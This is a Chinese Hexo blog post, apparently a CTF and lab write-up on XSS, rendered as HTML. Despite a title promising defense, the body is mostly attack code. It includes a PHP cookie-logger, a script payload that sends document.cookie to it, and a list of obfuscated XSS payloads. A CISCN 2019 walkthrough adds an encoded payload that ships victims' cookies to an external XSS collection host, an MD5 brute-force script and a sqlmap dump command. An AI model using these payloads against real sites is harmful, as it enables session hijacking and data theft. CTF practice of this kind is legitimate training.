@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head>
+    <meta charset="utf-8">
+<title>XSS跨站脚本攻击剖析与防御 - Hexo</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
+
+
+
+
+<meta name="description" content="">
+
+
+
+
+
+    <meta name="description" content="cookie&amp;#x6B3A;&amp;#x9A97;&amp;#x653B;&amp;#x51FB;index.php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS跨站脚本攻击剖析与防御">
+<meta property="og:url" content="http://example.com/2019/11/19/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E5%89%96%E6%9E%90%E4%B8%8E%E9%98%B2%E5%BE%A1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="cookie&amp;#x6B3A;&amp;#x9A97;&amp;#x653B;&amp;#x51FB;index.php">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-11-19T06:22:15.000Z">
+<meta property="article:modified_time" content="2020-11-24T04:53:14.524Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+<link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                <img src="/images/logo.png" alt="" height="28">
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">Archives</a>
+            
+            <a class="navbar-item "
+               href="/friends">Friends</a>
+            
+            <a class="navbar-item "
+               href="/about">About</a>
+            
+            <a class="navbar-item "
+               href="/tags">Tags</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Search" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            
+            <a class="navbar-item" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            XSS跨站脚本攻击剖析与防御
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            
+                <time datetime="2019-11-19T06:22:15.000Z" itemprop="datePublished">19 Nov 2019</time>
+            
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/Web/">Web</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            2 minutes read (About 280 words)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <html><head></head><body><h4 id="cookie&#x6B3A;&#x9A97;&#x653B;&#x51FB;"><a href="#cookie&#x6B3A;&#x9A97;&#x653B;&#x51FB;" class="headerlink" title="cookie&#x6B3A;&#x9A97;&#x653B;&#x51FB;"></a>cookie&#x6B3A;&#x9A97;&#x653B;&#x51FB;</h4><p>index.php</p>
+<a id="more"></a>
+
+
+
+
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;cookie&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&apos;name&apos;</span>]))</span><br><span class="line">{</span><br><span class="line"><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&apos;name&apos;</span>];</span><br><span class="line">}</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="hljs-string">&quot;&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br><span class="line">Name: &lt;input type=<span class="hljs-string">&quot;text&quot;</span> name=<span class="hljs-string">&quot;name&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;input type=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+<p>getcookie.php</p>
+<figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"><span class="hljs-variable">$cookie1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&apos;cookie&apos;</span>];</span><br><span class="line"><span class="hljs-variable">$log</span>=fopen(<span class="hljs-string">&quot;demo.txt&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);</span><br><span class="line">fwrite(<span class="hljs-variable">$log</span>,<span class="hljs-variable">$cookie1</span>.<span class="hljs-string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="hljs-variable">$log</span>)</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>payload,&#x8F93;&#x5165;&#x6846;&#x8F93;&#x5165;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var img = document.createElement(&apos;img&apos;);img.src = &apos;http://localhost/getcookie.php?cookie=&apos;+encodeURIComponent(document.cookie);&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>&#x6210;&#x529F;&#x5728;demo.txt&#x4E2D;&#x83B7;&#x5F97;cookie</p>
+<h4 id="&#x4E00;&#x4E9B;payload"><a href="#&#x4E00;&#x4E9B;payload" class="headerlink" title="&#x4E00;&#x4E9B;payload"></a>&#x4E00;&#x4E9B;payload</h4><figure class="highlight js hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src = <span class="hljs-string">&quot;#&quot;</span> onerror=alert(<span class="hljs-regexp">/xss/</span>)&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;</span>&gt;</span><br><span class="line">&lt;img src=<span class="hljs-string">&quot;1&quot;</span> onerror=<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;</span>)&gt;&lt;/img&gt;</span><br><span class="line">&#x539F;code:</span><br><span class="line">&lt;img src=<span class="hljs-string">&quot;1&quot;</span> onerror=<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;alert(&apos;xss&apos;)&quot;</span>)&gt;&lt;/img&gt;</span><br><span class="line">&lt;a href=<span class="hljs-string">&quot;&quot;</span> onclick=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;aaaaa&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="hljs-string">&quot;&quot;</span> onclick=<span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;</span>)&gt;aaaaa&lt;/a&gt; </span><br><span class="line">&lt;iframe src=javascript:alert(<span class="hljs-string">&apos;xss&apos;</span>);height=<span class="hljs-number">0</span> width=<span class="hljs-number">0</span> /&gt;&lt;iframe&gt; </span><br><span class="line">&lt;iframe src=<span class="hljs-string">&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=<span class="hljs-number">1</span> onmouseover=alert(<span class="hljs-string">&apos;xss&apos;</span>) y=<span class="hljs-number">2016</span> /&gt;&lt;iframe&gt; </span><br></pre></td></tr></tbody></table></figure>
+
+<h4 id="CISCN-2019-&#x534E;&#x4E1C;&#x5317;&#x8D5B;&#x533A;-Web2"><a href="#CISCN-2019-&#x534E;&#x4E1C;&#x5317;&#x8D5B;&#x533A;-Web2" class="headerlink" title="CISCN 2019 &#x534E;&#x4E1C;&#x5317;&#x8D5B;&#x533A; Web2"></a>CISCN 2019 &#x534E;&#x4E1C;&#x5317;&#x8D5B;&#x533A; Web2</h4><p>&#x65B9;&#x6CD5;&#xFF1A; &#x6295;&#x7A3F;-&#x300B;&#x53CD;&#x9988;-&#x300B;&#x83B7;&#x5F97;&#x7BA1;&#x7406;&#x5458;cookie-&#x300B;&#x6CE8;&#x5165;</p>
+<p>HTML Markup&#x8F6C;&#x7801;</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">in_str = &quot;(function(){window.location.href=&apos;http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location=&apos;+escape((function(){try{return document.location.href}catch(e){return&apos;&apos;}})())+&apos;&amp;toplocation=&apos;+escape((function(){try{return top.location.href}catch(e){return&apos;&apos;}})())+&apos;&amp;cookie=&apos;+escape((function(){try{return document.cookie}catch(e){return&apos;&apos;}})())+&apos;&amp;opener=&apos;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&apos;&apos;}catch(e){return&apos;&apos;}})());})();&quot;</span><br><span class="line"></span><br><span class="line">output = &quot;&quot;</span><br><span class="line"></span><br><span class="line">for c in in_str:</span><br><span class="line">    output += &quot;&amp;#&quot; + str(ord(c))</span><br><span class="line"></span><br><span class="line">print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x4E22;&#x5E73;&#x53F0;&#x4E0A;&#x540E;<br>&#x7136;&#x540E;&#x7206;&#x7834;md5</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">for i in range(1, 10000001):</span><br><span class="line">    s = hashlib.md5(str(i).encode(&apos;utf-8&apos;)).hexdigest()[0:6]</span><br><span class="line">    if s == &quot;4426f0&quot;:</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br></pre></td></tr></tbody></table></figure>
+<p>&#x7F6E;&#x7BA1;&#x7406;&#x5458; cookie&#xFF0C;&#x731C;&#x6D4B;&#x540E;&#x53F0;&#x8DEF;&#x5F84;&#xFF0C;&#x53D1;&#x73B0; /admin.php &#x80FD;&#x8BBF;&#x95EE;&#x3002;<br>&#x6CE8;&#x5165;&#x83B7;&#x53D6;flag</p>
+<figure class="highlight plain hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http://502ce080-5cd5-4c3d-8467-1fc354132f71.node3.buuoj.cn/admin.php?id=2 --cookie=&quot;PHPSESSID=57bd5e76b87b83da7e7332ad6f60cdd7&quot; -T flag --dump --flush-session</span><br><span class="line">--fresh-queries --fresh-queries --delay 0.1</span><br></pre></td></tr></tbody></table></figure></body></html>
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/Web/">#Web</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2019/11/19/md5%E7%AE%97%E6%B3%95%E7%9A%84%E5%AD%A6%E4%B9%A0%E5%92%8Cc-python3%E7%9A%84%E5%AE%9E%E7%8E%B0/"></a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2019/10/03/PHP%E6%96%87%E6%A1%A3%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AC%94%E8%AE%B0/">PHP文档的一些笔记</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 John Doe&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
+
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("en-AU");
+</script>
+
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
+
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-widget-model-epsilon2_1"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
